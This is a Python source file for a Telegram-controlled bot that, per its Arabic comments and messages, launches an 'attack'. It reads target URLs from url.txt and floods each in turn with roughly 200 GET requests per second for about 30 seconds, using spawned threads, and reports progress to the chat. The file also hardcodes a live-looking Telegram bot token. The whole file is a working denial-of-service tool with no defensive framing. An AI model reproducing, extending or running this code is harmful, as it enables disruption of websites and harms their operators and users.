import threading
import time
import requests
from flask import Flask
from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext

# إعدادات
is_running = False
urls = []
url_index = 0
current_chat_id = None

# Flask
app = Flask(__name__)
@app.route("/")
def home():
    return "hello FAILED REQUESTS<br>IMAD213"

def run_flask():
    app.run(host="0.0.0.0", port=5000)

# تحميل الروابط من ملف
def load_urls():
    with open("url.txt", "r") as f:
        return [line.strip() for line in f if line.strip() and not line.strip().startswith("#")]

# إرسال ~100 طلب/ثانية لمدة دقيقة لرابط محدد
def attack_url_for_one_minute(url, chat_id, context: CallbackContext, index):
    end_time = time.time() + 30
    context.bot.send_message(chat_id, f"🚀 بدأ الإرسال على الرابط رقم {index+1}: {url}")
    while is_running and time.time() < end_time:
        try:
            for _ in range(10):
                threading.Thread(
                    target=lambda: [requests.get(url) for _ in range(20)],
                    daemon=True
                ).start()
        except:
            pass
        time.sleep(1)

# تنفيذ الهجوم على كل رابط لمدة دقيقة، بالتسلسل
def gradual_attack(context: CallbackContext):
    global url_index
    while is_running and url_index < len(urls):
        url = urls[url_index]
        attack_url_for_one_minute(url, current_chat_id, context, url_index)
        url_index += 1
        if url_index < len(urls):
            context.bot.send_message(current_chat_id, f"⏭️ تم الانتهاء من الرابط رقم {url_index}, جاري الانتقال للرابط التالي...")
        else:
            context.bot.send_message(current_chat_id, "✅ تم الانتهاء من جميع الروابط.")
    # إنهاء الإرسال بعد آخر رابط
    stop_silent()

# أمر /start
def start(update: Update, context: CallbackContext):
    global is_running, urls, url_index, current_chat_id
    if is_running:
        update.message.reply_text("⚠️ الهجوم يعمل بالفعل.")
        return

    urls = load_urls()
    if not urls:
        update.message.reply_text("❌ لم يتم العثور على روابط صالحة في url.txt.")
        return

    is_running = True
    url_index = 0
    current_chat_id = update.message.chat_id
    update.message.reply_text("🚀 بدأ الهجوم على الروابط بالتسلسل، سيتم الإرسال لمدة دقيقة لكل رابط.")
    threading.Thread(target=gradual_attack, args=(context,), daemon=True).start()

# أمر /stop
def stop(update: Update, context: CallbackContext):
    global is_running
    if not is_running:
        update.message.reply_text("ℹ️ لا يوجد إرسال نشط.")
        return
    is_running = False
    update.message.reply_text("🛑 تم إيقاف الإرسال يدويًا.")

# إيقاف صامت بعد الانتهاء
def stop_silent():
    global is_running
    is_running = False

# تشغيل البوت وFlask
def main():
    TOKEN = "7774881594:AAGrjc0-ikU-3OMaivzZoYTwajV0jcu8P0Q"
    updater = Updater(TOKEN, use_context=True)
    dp = updater.dispatcher

    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("stop", stop))

    threading.Thread(target=run_flask, daemon=True).start()
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
